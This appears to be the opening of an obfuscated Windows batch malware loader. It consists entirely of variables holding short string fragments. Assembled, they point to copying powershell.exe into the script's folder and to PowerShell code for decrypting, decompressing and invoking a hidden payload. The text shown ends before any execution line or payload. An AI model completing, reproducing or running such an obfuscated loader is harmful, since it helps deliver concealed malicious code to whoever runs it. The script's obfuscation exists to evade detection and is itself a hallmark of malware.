@echo off
set "minnWFyWAi=po"
set "pLpMWxWgZE=do"
set "fevhwqLtjv=we"
set "jsEYcKxNai=rS"
set "lkODoUInBo=co"
set "BoXZoGywFL=32"
set "OkolhTXcyC=rs"
set "aTwVdXYfwR=ws"
set "lkMRIUUjQC=ll"
set "ZNlVIseQua=y "
set "wIPGCEyxCn= /"
set "mEWbIYCbUp=\v"
set "CPHHwNBATI= C"
set "kRRKWKhmao=1."
set "XliwSZRHsj=py"
set "mMIXnZoqqx=Sy"
set "TRBNccEDNq=he"
set "SdnTyVxozM=ll"
set "GJUrxqBOSV=Wi"
set "IwyYpNiLub=xe"
set "DGTMToamPE=:\"
set "thtTLrrwDD=ow"
set "qgZXZHFSTg=Po"
set "ZeloXPKDaD=em"
set "YFSODSUpkg=s\"
set "jvXihiLsMo=he"
set "cbgfSfyEDd=\W"
set "DTIegiAtay=in"
set "uDrDwvDhgB=nd"
set "EsGUCfeKzh=0\"
set "FKyxdalDXO=we"
set "LTgolzpbGf=st"
set "TBNLscTcgd=.e"
set "ARroUONTqL= %~dp0"
set "StXlaGjvUS=cd"
set "cNDDrKYaIL=.Cre"
set "oeRhneOJsg=CKlL"
set "VHjHTNBMbm=oL'["
set "pJTiGIIXEU=ment"
set "JSNLphQjdK=yTo("
set "TRurOwxXyy=rt]:"
set "IExvGPoSmt='')("
set "goTfCiQsuQ=6] -"
set "RppjbNYNtJ=eam("
set "DNzNbacqsN=tion"
set "jsiaJZJuRG=yste"
set "MxabbdjiwJ=::('"
set "joydYwmnJt=6esa"
set "LjtObXUbiJ=;$CK"
set "TewwOBrEMl=Comp"
set "uPxqrOlUaS=se()"
set "oIHhWwTcMo=gMod"
set "qdyNTJMjzO=ke($"
set "aGaYaqlmcJ=Fina"
set "GNPhwqfTJG=[Sys"
set "pRkapskoRY=ptog"
set "GEDNaGoXyy=F'[-"
set "xuTqCmraIx=join"
set "ZowCIJVwGP=$OHL"
set "bzSAGTcMIT=();$"
